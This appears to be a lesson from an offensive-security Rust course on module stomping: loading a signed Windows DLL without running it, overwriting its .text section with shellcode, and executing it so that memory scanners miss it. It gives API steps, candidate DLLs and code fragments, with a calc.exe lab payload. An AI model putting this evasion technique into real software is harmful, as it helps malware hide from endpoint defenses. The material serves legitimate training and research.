# Module 16 — Module Stomping

## Concept

**Module stomping** (also called DLL hollowing or module overloading) defeats one of the most common in-memory detection strategies: checking whether executable memory is backed by a signed, legitimate image.

When a memory scanner walks the virtual address space of a running process, it looks at every executable region and asks: *is this region backed by a known, signed module on disk?* If shellcode is allocated in a standalone RWX heap region, the answer is no — instant detection. Module stomping flips that answer.

The technique:
1. **Load a legitimate signed DLL** into the target process using `LoadLibraryExA` with `DONT_RESOLVE_DLL_REFERENCES`. The DLL's image is mapped — its sections occupy process memory — but `DllMain` is never called and its imports are never resolved. The DLL is "present" but not "running".
2. **Find the `.text` section** of the loaded DLL by parsing its PE headers in memory.
3. **Overwrite the `.text` section** with your shellcode. The shellcode now occupies memory that is backed by a signed, legitimate DLL.
4. **Execute** by jumping into the start of the stomped `.text` section.

From a memory scanner's perspective, the shellcode appears to be part of the signed DLL. `VirtualQueryEx` reports the region as `MEM_IMAGE` backed by a trusted path. Scanners that check for *unsigned* or *anonymous* executable regions miss it entirely.

### Why this module follows Module 07 and Module 08

You need to parse PE headers in memory — same skill as modules 04, 07. The loaded DLL is a fully mapped PE image. You walk `IMAGE_DOS_HEADER → IMAGE_NT_HEADERS64 → IMAGE_SECTION_HEADER[]` to find `.text`, exactly as you would in a reflective loader.

### Detection surface vs. prior techniques

| Technique | Executable region backed by signed image? | DllMain called? | New thread created? |
|---|---|---|---|
| Module 02 — shellcode injection | No (anonymous heap RWX) | — | Yes (CreateRemoteThread) |
| Module 03 — DLL injection | Yes (full DLL load) | Yes | Yes |
| Module 07 — reflective loader | No (manual allocation) | No | varies |
| **Module 16 — module stomping** | **Yes (DONT_RESOLVE_DLL_REFERENCES)** | **No** | **No** |

---

## Choosing a DLL to Stomp

Not every DLL is a good candidate. You need:

1. **Large `.text` section** — must be at least as large as your shellcode. Use `dumpbin /headers` or PE-bear to inspect sizes before choosing.
2. **Not actively used** by the process or the OS at runtime. Stomping a DLL that's being called will crash the process.
3. **Signed** — the whole point is that the region looks legitimate. System DLLs in `C:\Windows\System32\` are Microsoft-signed.

Good candidates on most Windows 10/11 systems:
- `C:\Windows\System32\netfxcfg.dll` (~40 KB `.text`)
- `C:\Windows\System32\diasymreader.dll` (~200 KB `.text`)
- `C:\Windows\System32\comsvcs.dll` — be careful; some processes use it

Check `.text` size first:
```
dumpbin /headers C:\Windows\System32\netfxcfg.dll | findstr "virtual size"
```

---

## The `.text` section is PAGE_EXECUTE_READ

DLL `.text` sections are mapped with `PAGE_EXECUTE_READ` — readable and executable, but not writable. You must call `VirtualProtect` to add write permission before stomping, then restore the original protection afterwards.

Leaving the region as `PAGE_EXECUTE_READWRITE` is itself a detection signal (signed images are normally RX, not RWX). Always restore after writing.

---

## Task

Implement module stomping in seven steps. The skeleton in `src/main.rs` has `todo!()` for each step.

### Step 1 — Load the target DLL without running it

```
LoadLibraryExA(
    lplibfilename: PCSTR,            // null-terminated path to the DLL
    hfile: HANDLE,                   // always None (reserved parameter)
    dwflags: LOAD_LIBRARY_FLAGS,     // DONT_RESOLVE_DLL_REFERENCES — map sections only,
                                     //   skip DllMain and import resolution
) -> Result<HMODULE>                 // Ok(hmodule) on success; hmodule is also the image base
```

The returned `HMODULE` is a pointer to the DLL's base in the current process's address space. Cast it to `usize` for PE header arithmetic.

### Step 2 — Parse PE headers to find `.text`

The loaded DLL is a mapped PE image. Navigate the same header chain you used in modules 04 and 07:

```
IMAGE_DOS_HEADER  at base
  .e_lfanew       → byte offset to IMAGE_NT_HEADERS64

IMAGE_NT_HEADERS64 at base + e_lfanew
  .FileHeader.NumberOfSections  → count of section headers
  (immediately followed by section headers in memory)

IMAGE_SECTION_HEADER[i]
  .Name           → 8-byte array; compare with b".text\0\0\0"
  .VirtualAddress → RVA of section start (add to base for VA)
  .SizeOfRawData  → size of the section in the file / mapped image
```

Iterate sections until `.Name == b".text\0\0\0"`. Save `base + VirtualAddress` and `SizeOfRawData`.

### Step 3 — Verify the shellcode fits

Assert that `text_size >= SHELLCODE.len()`. If your shellcode is too large, choose a DLL with a bigger `.text` section and rebuild.

### Step 4 — Remove write protection

```
VirtualProtect(
    lpaddress: *const c_void,            // text_va as *const c_void — start of .text
    dwsize: usize,                       // text_size — size of the .text section
    flnewprotect: PAGE_PROTECTION_FLAGS, // PAGE_EXECUTE_READWRITE — add write permission
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS, // &mut old_protect — saved for step 6
) -> Result<()>
```

Save `old_protect` — it will be `PAGE_EXECUTE_READ` for a normal DLL `.text` section.

### Step 5 — Write shellcode into `.text`

```rust
std::ptr::copy_nonoverlapping(
    SHELLCODE.as_ptr(),      // source: your shellcode bytes
    text_va as *mut u8,      // destination: start of the .text section
    SHELLCODE.len(),         // byte count
);
```

This overwrites the beginning of the DLL's `.text` section with your shellcode. Bytes beyond `SHELLCODE.len()` are left as-is (the rest of the DLL's original code).

### Step 6 — Restore original protection

```
VirtualProtect(
    lpaddress: *const c_void,            // text_va as *const c_void
    dwsize: usize,                       // text_size
    flnewprotect: PAGE_PROTECTION_FLAGS, // old_protect (PAGE_EXECUTE_READ)
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS, // &mut dummy — throwaway
) -> Result<()>
```

The region is now back to `PAGE_EXECUTE_READ`. The shellcode is executable but the RWX state is gone.

### Step 7 — Execute the shellcode

Transmute the section address to a function pointer and call it:

```rust
let f: unsafe extern "system" fn() = std::mem::transmute(text_va as *const ());
f();
```

The CPU jumps to the shellcode, which now appears — to any memory scanner — to be executing within a signed DLL's `.text` section.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p module-stomping` succeeds
- [ ] Running on the VM opens `calc.exe` (shellcode executes)
- [ ] Process Monitor shows the DLL loaded with `DONT_RESOLVE_DLL_REFERENCES` (no DllMain event for it)
- [ ] `.text` protection is restored to the original value after stomping
- [ ] An assertion fires if the shellcode is larger than the `.text` section
- [ ] `VirtualProtect` return values are checked (`.expect(...)` or handled)

---

## Key Types

**`HMODULE`** — returned by `LoadLibraryExA`. Also the image base address of the loaded DLL. Cast `.0 as usize` to use it as a pointer for header parsing.

**`LOAD_LIBRARY_FLAGS`** — the flags parameter to `LoadLibraryExA`. Use `DONT_RESOLVE_DLL_REFERENCES` (value `0x1`) to map without running DllMain.

**`IMAGE_SECTION_HEADER`** — from `Win32_System_Diagnostics_Debug`. Fields used here:
- `Name: [u8; 8]` — the section name, null-padded to 8 bytes
- `VirtualAddress: u32` — RVA of the section in the mapped image
- `SizeOfRawData: u32` — section size (use this for the stomp region size)

**`PAGE_PROTECTION_FLAGS`** — a newtype wrapping `u32`. `PAGE_EXECUTE_READ` and `PAGE_EXECUTE_READWRITE` are constants from `Win32_System_Memory`.

---

## Hints

- The section header array starts immediately after `IMAGE_NT_HEADERS64` in memory — there is no gap. Cast `(nt_ptr as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER` to get the first header, then use `.add(i)` to index.
- Comparing section names: `(*section).Name == *b".text\0\0\0"` — the name field is exactly 8 bytes, null-padded. A 5-character name like `.text` uses bytes 5-7 as `\0`.
- `DONT_RESOLVE_DLL_REFERENCES` is in `windows::Win32::System::LibraryLoader`. You also need `LoadLibraryExA` from the same module.
- If `netfxcfg.dll` is not present on your VM, try `diasymreader.dll` or inspect available DLLs with `dumpbin /headers` to find one with a large enough `.text` section.
- `VirtualProtect` takes `*const c_void` for the address. Cast `text_va as *const c_void`.
- The `FreeLibrary` call to unload the DLL is optional here but good practice. The process exits immediately after anyway.

---

## Submission

Paste `16-module-stomping/src/main.rs` and ask for a review.
